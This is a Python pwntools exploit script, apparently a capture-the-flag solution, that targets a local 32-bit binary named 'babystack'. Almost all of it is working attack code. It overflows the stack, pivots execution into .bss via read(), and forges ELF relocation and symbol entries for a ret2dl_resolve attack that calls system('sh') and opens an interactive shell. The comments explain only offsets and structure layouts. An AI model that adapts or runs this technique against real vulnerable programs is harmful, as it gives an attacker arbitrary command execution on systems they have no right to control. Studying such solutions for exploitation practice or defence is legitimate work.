from pwn import * 


p=process("./babystack")
binary = ELF("babystack")

new_memory = 0x804acf0#.bss
leave_ret = 0x08048455 #: leave; ret;

#jump to PLT to resolve a symbol
'''
  0x8048300 <read@plt>:        jmp    DWORD PTR ds:0x804a00c    
   0x8048306 <read@plt+6>:      push   0x0                    ----> offset for the read symbol                   
   0x804830b <read@plt+11>:     jmp    0x80482f0              ---->_dl_runtime_resolve
'''
resolver = 0x80482f0



#readelf -d 
STRTAB = 0x804822c    #str table
SYMTAB = 0x80481cc    #symbol table
JMPREL = 0x80482b0    #responsible for relocating function address 


'''
Typedef struct {
      Elf32_Addr r_offset; // got.plt entry
      Elf32_Word r_info; // index from symbol table
} Elf32_Rel;

'''
### Stack pivoting read(0,new_memory,0x80)
payload = ''
payload += 'a'*40
payload += p32(new_memory) #4 bytes para EIP
payload += p32(binary.plt['read']) #read()
payload += p32(leave_ret) #return address
payload += p32(0) #read(0,
payload += p32(new_memory) #read(0,new_memory,
payload += p32(0x80) #read(0,new_memory,0x80)

#compute offsets and forged structures
forged_ara = new_memory + 0x14
rel_offset = forged_ara - JMPREL
elf32_sym = forged_ara + 0x8

align = 0x10 - ((elf32_sym -SYMTAB) % 0x10) 

elf32_sym = elf32_sym + align
index_sym = (elf32_sym - SYMTAB) / 0x10

r_info = (index_sym << 8) | 0x7

#.rel.plt entry
elf32_rel = p32(binary.got['read']) + p32(r_info)

st_name = (elf32_sym + 0x10) - STRTAB
elf32_sym_struct = p32(st_name) + p32(0) + p32(0) + p32(0x12)



payload2 = 'AAAA' #fake ebp
payload2 += p32(resolver) #ret2 dl_resolve
payload2 += p32(rel_offset) # JMPRL + offset = struct
payload2 += 'AAAA' #fake return
payload2 += p32(new_memory+100)
payload2 += elf32_rel
payload2 += 'A' * align
payload2 += elf32_sym_struct 
payload2 += "system\x00"
x = (100-len(payload2))
payload2 += 'A' * x
payload2 += "sh\x00"
x = (0x80 - len(payload2))
payload2 += 'A' * x
 
p.send(payload)
p.send(payload2)
p.interactive()
